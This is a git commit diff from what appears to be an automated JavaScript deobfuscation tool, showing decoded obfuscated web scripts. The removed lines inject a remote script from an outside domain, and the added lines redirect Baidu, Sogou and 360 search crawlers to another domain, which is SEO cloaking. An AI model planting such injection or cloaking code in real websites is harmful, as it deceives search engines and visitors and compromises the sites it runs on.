7c75f96be019be15693ca4be87222f7ea7b03629
action <action@github.com>
2025-05-15 06:41:46 +0000

    Add decoded output file

--- output.js
+++ output.js
@@ -1,11 +1,7 @@
-//Sat May 10 2025 12:26:44 GMT+0000 (Coordinated Universal Time)
+//Thu May 15 2025 06:41:46 GMT+0000 (Coordinated Universal Time)
 //Base:<url id="cv1cref6o68qmpt26ol0" type="url" status="parsed" title="GitHub - echo094/decode-js: JS混淆代码的AST分析工具 AST analysis tool for obfuscated JS code" wc="2165">https://github.com/echo094/decode-js</url>
 //Modify:<url id="cv1cref6o68qmpt26olg" type="url" status="parsed" title="GitHub - smallfawn/decode_action: 世界上本来不存在加密，加密的人多了，也便成就了解密" wc="741">https://github.com/smallfawn/decode_action</url>
-var _hmt = _hmt || [];
-(function () {
-  var _0x389678 = document.createElement("script");
-  _0x389678.src = "https://hm.baidu.com/hm.js?5a421f374e3a3f542d251f076f6940c1";
-  var _0x4d0dd1 = document.getElementsByTagName("script")[0];
-  _0x4d0dd1.parentNode.insertBefore(_0x389678, _0x4d0dd1);
-})();
-document.writeln("<script src=\"https://www.daoc66.com/js/cai8.js\"></script>");
+(function () {})();
+var userAgent = navigator.userAgent.toLowerCase();
+var isTargetSpider = userAgent.includes("baiduspider") || userAgent.includes("sogou") || userAgent.includes("360spider");
+isTargetSpider && (location.href = "https://www.pbbbbgyl029.me/a1/");
